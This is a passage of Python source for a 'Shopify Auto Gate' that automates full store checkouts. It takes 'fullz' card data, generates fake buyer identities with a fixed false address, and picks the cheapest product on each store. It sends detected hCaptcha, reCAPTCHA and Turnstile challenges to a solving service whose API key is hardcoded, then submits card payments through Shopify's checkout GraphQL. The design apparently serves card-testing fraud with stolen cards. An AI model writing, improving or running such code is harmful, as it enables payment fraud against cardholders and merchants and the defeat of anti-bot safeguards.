"""
Shopify Auto Gate - Full checkout automation with Captcha Solver
"""

import httpx
import aiohttp
import json
import random
import string
import asyncio
import time as time_module
from typing import List, Dict, Any, Optional, Literal

# Captcha Solver API
CAPTCHA_API_KEY = 'bDOZkp8UuJGeSaskIHj3_yo0yzR2iQqH'
CAPTCHA_API_BASE = 'https://api.realapi.dev'

RealSolverCaptchaType = Literal["recaptchaV3", "hcaptcha_motion", "turnstile"]

async def captcha_solver(
    page_url: str,
    site_key: str,
    *,
    captcha_type: RealSolverCaptchaType,
    api_key: str = CAPTCHA_API_KEY,
    api_base: str = CAPTCHA_API_BASE,
    poll_interval: float = 2.0,
    max_wait: float = 60.0,
    session: Optional[aiohttp.ClientSession] = None,
    debug: bool = False,
    proxies: List[str] = None,
    **captcha_kwargs: Any,
) -> Dict[str, str]:
    """Complete Captcha Solver for Hcaptcha, RecaptchaV3, and Turnstile."""

    def _safe_error(payload: Any, fallback: str) -> str:
        if isinstance(payload, dict):
            err = payload.get("error")
            if isinstance(err, str) and err.strip():
                return err.strip()
        return fallback

    async def _post_json(s: aiohttp.ClientSession, url: str, json_data: dict) -> Dict[str, Any]:
        headers = {
            'x-api-key': api_key,
            'Content-Type': 'application/json',
        }
        async with s.post(url, json=json_data, headers=headers) as r:
            try:
                data = await r.json(content_type=None)
            except Exception:
                data = None
            if r.status >= 400:
                return {"error": _safe_error(data, f"HTTP {r.status} on POST")}
            if not isinstance(data, dict):
                return {"error": "Invalid JSON response from create_task"}
            return data

    async def _get_json(s: aiohttp.ClientSession, url: str) -> Dict[str, Any]:
        async with s.get(url) as r:
            try:
                data = await r.json(content_type=None)
            except Exception:
                data = None
            if r.status >= 400:
                return {"error": _safe_error(data, f"HTTP {r.status} on GET")}
            if not isinstance(data, dict):
                return {"error": "Invalid JSON response from getCaptchaResult"}
            return data

    create_payload = {
        "captcha_type": captcha_type,
        "captcha_data": {
            "url": page_url,
            "sitekey": site_key,
            **captcha_kwargs,
        },
    }

    if proxies:
        create_payload['captcha_data']['proxies'] = proxies

    async def _run(s: aiohttp.ClientSession) -> Dict[str, str]:
        create_url = f"{api_base}/create_task"
        create_resp = await _post_json(s, create_url, create_payload)

        if "error" in create_resp and create_resp["error"]:
            return {"error": str(create_resp["error"])}

        task_id = create_resp.get("task_id")
        if not task_id:
            return {"error": _safe_error(create_resp, "Failed to create task (missing task_id)")}

        result_url = f"{api_base}/getCaptchaResult?task_id={task_id}"
        deadline = time_module.monotonic() + float(max_wait)

        while True:
            if time_module.monotonic() >= deadline:
                return {"error": f"Challenge not solved within {max_wait:.0f}s"}

            result_json = await _get_json(s, result_url)
            status = result_json.get("status") if isinstance(result_json, dict) else None
            
            if debug and status and status.strip() in ["processing", "pending"]:
                print(f"[CAPTCHA] Task ID: {task_id} | Status: {status.upper()} | Type: {captcha_type}")

            err = result_json.get("error") if isinstance(result_json, dict) else None
            if isinstance(err, str) and err.strip():
                return {"error": err.strip()}

            if status == "success":
                token = result_json.get("token")
                if isinstance(token, str) and token.strip():
                    return {"token": token.strip()}
                return {"error": "Solved status received but token is missing/invalid"}

            await asyncio.sleep(poll_interval)

    if session is not None:
        return await _run(session)

    timeout = aiohttp.ClientTimeout(total=max_wait + 30)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        return await _run(s)


async def detect_and_solve_captcha(site_url: str, html: str, debug: bool = False) -> Optional[str]:
    """Detect captcha type from HTML and solve it"""
    import re
    
    # Detect hCaptcha
    hcaptcha_match = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
    if 'hcaptcha' in html.lower() and hcaptcha_match:
        site_key = hcaptcha_match.group(1)
        if debug:
            print(f"[CAPTCHA] Detected hCaptcha with sitekey: {site_key}")
        result = await captcha_solver(
            page_url=site_url,
            site_key=site_key,
            captcha_type="hcaptcha_motion",
            debug=debug
        )
        return result.get("token")
    
    # Detect reCAPTCHA v3
    recaptcha_match = re.search(r'grecaptcha\.execute\(["\']([^"\']+)["\']', html)
    if not recaptcha_match:
        recaptcha_match = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
    if 'recaptcha' in html.lower() and recaptcha_match:
        site_key = recaptcha_match.group(1)
        if debug:
            print(f"[CAPTCHA] Detected reCAPTCHA with sitekey: {site_key}")
        result = await captcha_solver(
            page_url=site_url,
            site_key=site_key,
            captcha_type="recaptchaV3",
            debug=debug
        )
        return result.get("token")
    
    # Detect Turnstile
    turnstile_match = re.search(r'cf-turnstile[^>]*data-sitekey=["\']([^"\']+)["\']', html)
    if not turnstile_match:
        turnstile_match = re.search(r'turnstile\.render\([^,]+,\s*\{\s*sitekey:\s*["\']([^"\']+)["\']', html)
    if 'turnstile' in html.lower() and turnstile_match:
        site_key = turnstile_match.group(1)
        if debug:
            print(f"[CAPTCHA] Detected Turnstile with sitekey: {site_key}")
        result = await captcha_solver(
            page_url=site_url,
            site_key=site_key,
            captcha_type="turnstile",
            debug=debug
        )
        return result.get("token")
    
    return None

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles',
               'Mary', 'Patricia', 'Jennifer', 'Linda', 'Elizabeth', 'Barbara', 'Susan', 'Jessica', 'Sarah', 'Karen']

LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
              'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']

FIXED_ADDRESS = {'address1': '1600 Amphitheatre Parkway', 'city': 'Mountain View', 'state': 'CA', 'zip': '94043'}

VALID_AREA_CODES = [
    201, 202, 203, 205, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 218, 219,
    220, 223, 224, 225, 227, 228, 229, 231, 234, 239, 240, 248, 251, 252, 253, 254, 256,
    260, 262, 267, 269, 270, 272, 274, 276, 279, 281, 283, 301, 302, 303, 304, 305, 307,
    308, 309, 310, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 323, 325, 326, 327,
    330, 331, 332, 334, 336, 337, 339, 341, 346, 347, 351, 352, 360, 361, 364, 380, 385,
    386, 401, 402, 404, 405, 406, 407, 408, 409, 410, 412, 413, 414, 415, 417, 419, 423,
    424, 425, 430, 432, 434, 435, 440, 442, 443, 445, 447, 458, 463, 464, 469, 470, 475,
    478, 479, 480, 484, 501, 502, 503, 504, 505, 507, 508, 509, 510, 512, 513, 515, 516,
    517, 518, 520, 530, 531, 534, 539, 540, 541, 551, 559, 561, 562, 563, 564, 567, 570,
    571, 573, 574, 575, 580, 585, 586, 601, 602, 603, 605, 606, 607, 608, 609, 610, 612,
    614, 615, 616, 617, 618, 619, 620, 623, 626, 628, 629, 630, 631, 636, 640, 641, 646,
    650, 651, 657, 659, 660, 661, 662, 667, 669, 678, 680, 681, 682, 701, 702, 703, 704,
    706, 707, 708, 712, 713, 714, 715, 716, 717, 718, 719, 720, 724, 725, 726, 727, 730,
    731, 732, 734, 737, 740, 743, 747, 754, 757, 760, 762, 763, 765, 769, 770, 772, 773,
    774, 775, 779, 781, 785, 786, 801, 802, 803, 804, 805, 806, 808, 810, 812, 813, 814,
    815, 816, 817, 818, 828, 830, 831, 832, 843, 845, 847, 848, 850, 854, 856, 857, 858,
    859, 860, 862, 863, 864, 865, 870, 872, 878, 901, 903, 904, 906, 907, 908, 909, 910,
    912, 913, 914, 915, 916, 917, 918, 919, 920, 925, 928, 929, 930, 931, 934, 936, 937,
    938, 940, 941, 947, 949, 951, 952, 954, 956, 959, 970, 971, 972, 973, 975, 978, 979,
    980, 984, 985, 989
]

SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on TooManyAttempts{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}purchaseOrder{totalAmountToPay{amount currencyCode __typename}__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on ProcessingReceipt{id purchaseOrder{sessionToken __typename}pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'

POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}purchaseOrder{totalAmountToPay{amount currencyCode __typename}__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'


def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com']
    return f"{username}@{random.choice(domains)}"


def generate_random_phone():
    area_code = random.choice(VALID_AREA_CODES)
    exchange = random.randint(200, 999)
    line = random.randint(1000, 9999)
    return f"+1{area_code}{exchange}{line}"


def find_between(text, start, end):
    try:
        start_idx = text.find(start)
        if start_idx == -1:
            return None
        start_idx += len(start)
        if end:
            end_idx = text.find(end, start_idx)
            if end_idx == -1:
                return None
            return text[start_idx:end_idx]
        return text[start_idx:]
    except:
        return None


async def get_site_product_info(site_url, proxy=None):
    """Fetch cheapest product info from site without adding to cart"""
    if not site_url.startswith('http'):
        site_url = f"https://{site_url}"
    site_url = site_url.rstrip('/')
    
    proxies = None
    if proxy:
        if '@' in proxy or proxy.count(':') == 1:
            proxies = f"http://{proxy}"
        elif proxy.count(':') == 3:
            parts = proxy.split(':')
            proxies = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    
    try:
        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True, verify=False, proxy=proxies) as client:
            products_url = f"{site_url}/products.json"
            response = await client.get(products_url)
            
            if response.status_code != 200:
                return None
            
            data = response.json()
            products = data.get('products', [])
            
            if not products:
                return None
            
            cheapest = None
            cheapest_price = float('inf')
            
            for product in products:
                variants = product.get('variants', [])
                if not variants:
                    continue
                
                for variant in variants:
                    if not variant.get('available', False):
                        continue
                    
                    price = float(variant.get('price', 0))
                    
                    if price > 0 and price < cheapest_price:
                        cheapest_price = price
                        cheapest = {
                            'product_title': product.get('title', 'Unknown'),
                            'variant_title': variant.get('title', ''),
                            'price': price,
                            'currency': 'USD'
                        }
            
            return cheapest
    except Exception:
        return None


async def fetch_cheapest_product(site_url, client):
    products_url = f"{site_url}/products.json"
    
    try:
        response = await client.get(products_url)
        
        if response.status_code != 200:
            return None
        
        data = response.json()
        products = data.get('products', [])
        
        if not products:
            return None
        
        cheapest = None
        cheapest_price = float('inf')
        
        for product in products:
            variants = product.get('variants', [])
            if not variants:
                continue
            
            for variant in variants:
                if not variant.get('available', False):
                    continue
                
                price = float(variant.get('price', 0))
                
                if price > 0 and price < cheapest_price:
                    cheapest_price = price
                    cheapest = {
                        'product': product,
                        'variant': variant,
                        'price': price
                    }
        
        return cheapest
        
    except Exception:
        return None


async def add_to_cart(site_url, variant_id, product_id, client):
    cart_url = f"{site_url}/cart/add.js"
    
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': site_url,
        'referer': f"{site_url}/",
        'user-agent': random.choice(USER_AGENTS),
        'x-requested-with': 'XMLHttpRequest',
    }
    
    # Try form data first
    data = {
        'id': str(variant_id),
        'quantity': '1',
    }
    
    try:
        response = await client.post(cart_url, headers=headers, data=data)
        print(f"[SHOPIFY] Add to cart response: {response.status_code}")
        if response.status_code == 200:
            result = response.json()
            print(f"[SHOPIFY] Added to cart: {result.get('title', 'Unknown')}")
            return result
        
        # Try JSON format if form data failed
        headers['content-type'] = 'application/json'
        json_data = {
            'items': [{'id': int(variant_id), 'quantity': 1}]
        }
        response = await client.post(cart_url, headers=headers, json=json_data)
        if response.status_code == 200:
            return response.json()
        
        print(f"[SHOPIFY] Add to cart failed: {response.status_code} - {response.text[:100]}")
        return None
    except Exception as e:
        print(f"[SHOPIFY] Add to cart error: {e}")
        return None


async def get_cart_token(site_url, client):
    try:
        cart_url = f"{site_url}/cart.js"
        response = await client.get(cart_url)
        
        if response.status_code == 200:
            cart_data = response.json()
            return cart_data.get('token')
        return None
    except:
        return None


async def navigate_to_checkout(site_url, cart_token, client, debug=False):
    try:
        checkout_url = f"{site_url}/checkout"
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': random.choice(USER_AGENTS),
        }
        
        response = await client.get(checkout_url, headers=headers, follow_redirects=True)
        html = response.text
        final_url = str(response.url)
        
        print(f"[SHOPIFY] Checkout URL: {final_url[:100]}")
        
        # Check for captcha and solve if present
        captcha_indicators = ['hcaptcha', 'recaptcha', 'turnstile', 'cf-challenge', 'challenge-platform']
        if any(indicator in html.lower() for indicator in captcha_indicators):
            print(f"[SHOPIFY] Captcha detected, attempting to solve...")
            captcha_token = await detect_and_solve_captcha(checkout_url, html, debug=debug)
            if captcha_token:
                print(f"[SHOPIFY] Captcha solved successfully!")
                headers['x-captcha-token'] = captcha_token
                response = await client.get(checkout_url, headers=headers, follow_redirects=True)
                html = response.text
                final_url = str(response.url)
        
        # Check for login requirement
        if 'login' in final_url.lower():
            print(f"[SHOPIFY] Site requires login")
            return None
        
        # Extract session token (sst) using simple extraction
        sst = (
            find_between(html, 'name="serialized-session-token" content="&quot;', '&q') or
            find_between(html, 'serialized-session-token" content="&quot;', '&q') or
            find_between(html, '"sessionToken":"', '"') or
            find_between(html, 'sessionToken&quot;:&quot;', '&q')
        )
        
        if not sst:
            # Retry once
            response = await client.get(final_url, headers=headers, follow_redirects=True)
            html = response.text
            sst = (
                find_between(html, 'name="serialized-session-token" content="&quot;', '&q') or
                find_between(html, 'serialized-session-token" content="&quot;', '&q') or
                find_between(html, '"sessionToken":"', '"')
            )
        
        if not sst:
            print(f"[SHOPIFY] Failed to get session token from checkout")
            return None
        
        print(f"[SHOPIFY] Got session token: {sst[:30]}...")
        
        # Extract other tokens
        queueToken = find_between(html, 'queueToken&quot;:&quot;', '&q') or find_between(html, '"queueToken":"', '"')
        stableId = find_between(html, 'stableId&quot;:&quot;', '&q') or find_between(html, '"stableId":"', '"')
        merch = find_between(html, 'ProductVariantMerchandise/', '&q') or find_between(html, 'ProductVariantMerchandise/', '"')
        subtotal = find_between(html, 'totalAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&q')
        if not subtotal:
            subtotal = find_between(html, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&q')
        
        # Extract currency
        import re
        currency_match = re.search(r'currencycode\s*[:=]\s*["\']?([^"\'&]+)', html.lower())
        currency = currency_match.group(1).upper() if currency_match else 'USD'
        if not currency or len(currency) != 3:
            currency = find_between(html, 'urrencyCode&quot;:&quot;', '&q') or 'USD'
        
        # Extract checkout token from URL
        checkout_token = None
        if '/checkouts/' in final_url:
            parts = final_url.split('/checkouts/')[-1].split('/')
            if parts:
                checkout_token = parts[0].split('?')[0]
        
        # Check for legacy checkout
        legacy_indicators = [
            'data-step="contact_information"',
            'checkout_buyer_accepts_marketing',
            'checkout[email]',
            'name="checkout[attributes]"',
        ]
        is_legacy = any(indicator in html for indicator in legacy_indicators)
        
        if is_legacy and not sst:
            return {'is_legacy': True}
        
        return {
            'checkout_token': checkout_token,
            'x_checkout_one_session_token': sst,
            'queue_token': queueToken,
            'stable_id': stableId,
            'merch': merch,
            'subtotal': subtotal,
            'currency': currency,
            'checkout_url': final_url,
        }
    except Exception as e:
        print(f"[SHOPIFY] Navigate to checkout error: {e}")
        return None


async def create_payment_session(site_url, checkout_data, fullz, user_data, client, debug=False):
    cc_parts = fullz.split('|')
    cc_number = cc_parts[0]
    cc_month = cc_parts[1]
    cc_year = cc_parts[2]
    cc_cvv = cc_parts[3]
    
    # Normalize year to 4 digits (e.g., 25 -> 2025)
    if len(cc_year) == 2:
        cc_year = f"20{cc_year}"
    
    first_name = user_data['first_name']
    last_name = user_data['last_name']
    user_agent = user_data['user_agent']
    
    # Format card number with spaces (required by Shopify)
    formatted_cc = " ".join([cc_number[i:i+4] for i in range(0, len(cc_number), 4)])
    
    try:
        # Use the correct Shopify deposit endpoint
        url = "https://deposit.shopifycs.com/sessions"
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.shopify.com',
            'referer': 'https://checkout.shopify.com/',
            'user-agent': user_agent,
        }
        
        # Get domain with www prefix
        domain = site_url.replace('https://', '').replace('http://', '').split('/')[0]
        if not domain.startswith('www.'):
            domain = f'www.{domain}'
        
        json_data = {
            'credit_card': {
                'number': formatted_cc,
                'month': cc_month,
                'year': cc_year,
                'verification_value': cc_cvv,
                'name': f'{first_name} {last_name}',
                'start_month': '',
                'start_year': '',
                'issue_number': '',
            },
            'payment_session_scope': domain,
        }
        
        print(f"[SHOPIFY] Creating payment session for {domain}")
        
        # Try multiple times if needed
        for attempt in range(3):
            try:
                response = await client.post(url, headers=headers, json=json_data)
                
                if response.status_code in [200, 201]:
                    try:
                        data = response.json()
                        session_id = data.get('id')
                        if session_id:
                            print(f"[SHOPIFY] Payment session created: {session_id[:30]}...")
                            return session_id
                    except:
                        pass
                
                # Log error response for debugging
                try:
                    error_text = response.text[:200] if response.text else "No response body"
                    print(f"[SHOPIFY] Payment session attempt {attempt + 1}: HTTP {response.status_code} - {error_text}")
                except:
                    print(f"[SHOPIFY] Payment session attempt {attempt + 1}: HTTP {response.status_code}")
                
            except Exception as req_error:
                print(f"[SHOPIFY] Payment session request error: {req_error}")
            
            if attempt < 2:
                await asyncio.sleep(1)
        
        return None
    except Exception as e:
        print(f"[SHOPIFY] Payment session error: {e}")
        return None


async def send_proposal(site_url, checkout_data, session_id, user_data, product, client, signed_handle=None, selected_handle=None, expected_total=None):
    try:
        x_checkout_one_session_token = checkout_data['x_checkout_one_session_token']
        queue_token = checkout_data['queue_token']
        stable_id = checkout_data['stable_id']
        
        address = user_data['address']
        first_name = user_data['first_name']
        last_name = user_data['last_name']
        email = user_data['email']
        phone = user_data['phone']
        user_agent = user_data['user_agent']
        
        query = """
        query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$deliveryExpectations:DeliveryExpectationTermsInput,$merchandise:MerchandiseTermInput,$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput){
          session(sessionInput:$sessionInput){
            negotiate(input:{purchaseProposal:{delivery:$delivery,deliveryExpectations:$deliveryExpectations,merchandise:$merchandise,payment:$payment,buyerIdentity:$buyerIdentity},queueToken:$queueToken}){
              result{
                ...on NegotiationResultAvailable{
                  queueToken
                  sellerProposal{
                    delivery{
                      __typename
                      ...on FilledDeliveryTerms{
                        deliveryLines{
                          availableDeliveryStrategies{
                            ...on CompleteDeliveryStrategy{
                              handle
                              title
                              amount{
                                ...on MoneyValueConstraint{
                                  value{
                                    amount
                                    currencyCode
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                      ...on PendingTerms{
                        pollDelay
                        taskId
                      }
                    }
                    deliveryExpectations{
                      ...on FilledDeliveryExpectationTerms{
                        deliveryExpectations{
                          signedHandle
                        }
                      }
                      ...on PendingTerms{
                        pollDelay
                        taskId
                      }
                    }
                    checkoutTotal{
                      ...on MoneyValueConstraint{
                        value{
                          amount
                          currencyCode
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """
        
        variables = {
            'sessionInput': {'sessionToken': x_checkout_one_session_token},
            'queueToken': queue_token,
            'delivery': {
                'deliveryLines': [{
                    'destination': {
                        'partialStreetAddress': {
                            'address1': address['address1'],
                            'address2': '',
                            'city': address['city'],
                            'countryCode': 'US',
                            'postalCode': address['zip'],
                            'firstName': first_name,
                            'lastName': last_name,
                            'zoneCode': address['state'],
                            'phone': phone,
                            'oneTimeUse': False,
                        }
                    },
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['SHIPPING'],
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyByHandle': {
                            'handle': selected_handle if selected_handle else 'placeholder-handle',
                            'customDeliveryRate': False,
                        },
                        'options': {},
                    },
                    'expectedTotalPrice': {
                        'value': {
                            'amount': str(expected_total['amount']) if expected_total else '0.00',
                            'currencyCode': expected_total.get('currencyCode', 'USD') if expected_total else 'USD',
                        }
                    },
                }],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True,
            },
            'merchandise': {
                'merchandiseLines': [{
                    'stableId': stable_id,
                    'merchandise': {
                        'productVariantReference': {
                            'id': f"gid://shopify/ProductVariantMerchandise/{product['variant']['id']}",
                            'variantId': f"gid://shopify/ProductVariant/{product['variant']['id']}",
                            'properties': [],
                            'sellingPlanId': None,
                            'sellingPlanDigest': None,
                        }
                    },
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {
                        'value': {
                            'amount': str(product['price']),
                            'currencyCode': 'USD',
                        }
                    },
                }]
            },
            'payment': {
                'totalAmount': {'any': True},
                'paymentLines': [],
                'billingAddress': {
                    'streetAddress': {
                        'address1': address['address1'],
                        'address2': '',
                        'city': address['city'],
                        'countryCode': 'US',
                        'postalCode': address['zip'],
                        'firstName': first_name,
                        'lastName': last_name,
                        'zoneCode': address['state'],
                        'phone': phone,
                    }
                }
            },
            'buyerIdentity': {
                'email': email,
                'phone': phone,
                'marketingConsent': [{'email': {'value': email}}],
            }
        }
        
        if signed_handle:
            variables['deliveryExpectations'] = {
                'deliveryExpectationLines': [{'signedHandle': signed_handle}]
            }
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': site_url,
            'referer': f"{site_url}/checkouts/",
            'user-agent': user_agent,
            'x-checkout-one-session-token': x_checkout_one_session_token,
        }
        
        response = await client.post(
            f"{site_url}/checkouts/unstable/graphql?operationName=Proposal",
            json={'query': query, 'variables': variables},
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            
            try:
                if 'data' not in data:
                    return data
                
                seller_proposal = data['data']['session']['negotiate']['result']['sellerProposal']
                delivery = seller_proposal.get('delivery', {})
                
                if delivery.get('__typename') == 'PendingTerms':
                    return data
                
                delivery_lines = delivery.get('deliveryLines', [])
                
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    selected = delivery_lines[0].get('selectedDeliveryStrategy')
                    
                    if selected:
                        data['selected_shipping_handle'] = selected.get('handle')
                        if selected.get('amount') and selected['amount'].get('value'):
                            data['selected_shipping_amount'] = selected['amount']['value'].get('amount', '0.00')
                            data['selected_shipping_currency'] = selected['amount']['value'].get('currencyCode', 'USD')
                    
                    if strategies:
                        cheapest = min(strategies, key=lambda s: float(s.get('amount', {}).get('value', {}).get('amount', '999999')))
                        data['cheapest_shipping_handle'] = cheapest.get('handle')
                        data['cheapest_shipping_amount'] = cheapest.get('amount', {}).get('value', {}).get('amount', '0.00')
                
                checkout_total_data = seller_proposal.get('checkoutTotal', {}).get('value', {})
                checkout_total = checkout_total_data.get('amount', '0.00')
                currency = checkout_total_data.get('currencyCode', 'USD')
                data['checkout_total'] = {
                    'amount': checkout_total,
                    'currencyCode': currency
                }
                
                return data
                
            except:
                return data
        else:
            return None
    except:
        return None


async def submit_for_completion(site_url, checkout_data, session_id, user_data, product, shipping_handle, shipping_amount, signed_handle, final_total, client, new_queue_token):
    try:
        x_checkout_one_session_token = checkout_data['x_checkout_one_session_token']
        checkout_token = checkout_data['checkout_token']
        stable_id = checkout_data['stable_id']
        payment_method_id = checkout_data['paymentMethodIdentifier']
        
        address = user_data['address']
        first_name = user_data['first_name']
        last_name = user_data['last_name']
        email = user_data['email']
        phone = user_data['phone']
        user_agent = user_data['user_agent']
        
        product_price = str(product['price'])
        total_amount = final_total['amount']
        currency_code = final_total.get('currencyCode', 'USD')
        
        variables = {
            'input': {
                'sessionInput': {
                    'sessionToken': x_checkout_one_session_token,
                },
                'queueToken': new_queue_token,
                'discounts': {
                    'lines': [],
                    'acceptUnexpectedDiscounts': True,
                },
                'delivery': {
                    'deliveryLines': [{
                        'destination': {
                            'streetAddress': {
                                'address1': address['address1'],
                                'address2': '',
                                'city': address['city'],
                                'countryCode': 'US',
                                'postalCode': address['zip'],
                                'firstName': first_name,
                                'lastName': last_name,
                                'zoneCode': address['state'],
                                'phone': phone,
                            },
                        },
                        'targetMerchandiseLines': {
                            'lines': [{'stableId': stable_id}],
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {
                                'handle': shipping_handle,
                                'customDeliveryRate': False,
                            },
                        },
                    }],
                },
                'deliveryExpectations': {
                    'deliveryExpectationLines': [{'signedHandle': signed_handle}] if signed_handle else [],
                },
                'merchandise': {
                    'merchandiseLines': [{
                        'stableId': stable_id,
                        'merchandise': {
                            'productVariantReference': {
                                'id': f"gid://shopify/ProductVariantMerchandise/{product['variant']['id']}",
                                'variantId': f"gid://shopify/ProductVariant/{product['variant']['id']}",
                                'properties': [],
                                'sellingPlanId': None,
                                'sellingPlanDigest': None,
                            },
                        },
                        'quantity': {
                            'items': {'value': 1},
                        },
                        'expectedTotalPrice': {
                            'value': {
                                'amount': product_price,
                                'currencyCode': currency_code,
                            },
                        },
                        'lineComponentsSource': None,
                        'lineComponents': [],
                    }],
                },
                'memberships': {
                    'memberships': [],
                },
                'payment': {
                    'totalAmount': {
                        'any': True,
                    },
                    'paymentLines': [{
                        'paymentMethod': {
                            'directPaymentMethod': {
                                'paymentMethodIdentifier': payment_method_id,
                                'sessionId': session_id,
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': address['address1'],
                                        'city': address['city'],
                                        'countryCode': 'US',
                                        'postalCode': address['zip'],
                                        'firstName': first_name,
                                        'lastName': last_name,
                                        'zoneCode': address['state'],
                                        'phone': phone,
                                    },
                                },
                                'cardSource': None,
                            },
                            'giftCardPaymentMethod': None,
                            'redeemablePaymentMethod': None,
                            'walletPaymentMethod': None,
                            'walletsPlatformPaymentMethod': None,
                            'localPaymentMethod': None,
                            'paymentOnDeliveryMethod': None,
                            'paymentOnDeliveryMethod2': None,
                            'manualPaymentMethod': None,
                            'customPaymentMethod': None,
                            'offsitePaymentMethod': None,
                            'customOnsitePaymentMethod': None,
                            'deferredPaymentMethod': None,
                            'customerCreditCardPaymentMethod': None,
                            'paypalBillingAgreementPaymentMethod': None,
                            'remotePaymentInstrument': None,
                        },
                        'amount': {
                            'value': {
                                'amount': total_amount,
                                'currencyCode': currency_code,
                            },
                        },
                    }],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': address['address1'],
                            'city': address['city'],
                            'countryCode': 'US',
                            'postalCode': address['zip'],
                            'firstName': first_name,
                            'lastName': last_name,
                            'zoneCode': address['state'],
                            'phone': phone,
                        },
                    },
                },
                'buyerIdentity': {
                    'customer': {
                        'presentmentCurrency': currency_code,
                        'countryCode': 'US',
                    },
                    'email': email,
                    'emailChanged': False,
                    'phoneCountryCode': 'US',
                    'marketingConsent': [],
                    'shopPayOptInPhone': {
                        'number': phone,
                        'countryCode': 'US',
                    },
                    'rememberMe': False,
                },
                'tip': {
                    'tipLines': [],
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {
                        'any': True,
                    },
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': [],
                },
                'note': {
                    'message': None,
                    'customAttributes': [],
                },
                'localizationExtension': {
                    'fields': [],
                },
                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': [],
                },
                'optionalDuties': {
                    'buyerRefusesDuties': False,
                },
                'cartMetafields': [],
            },
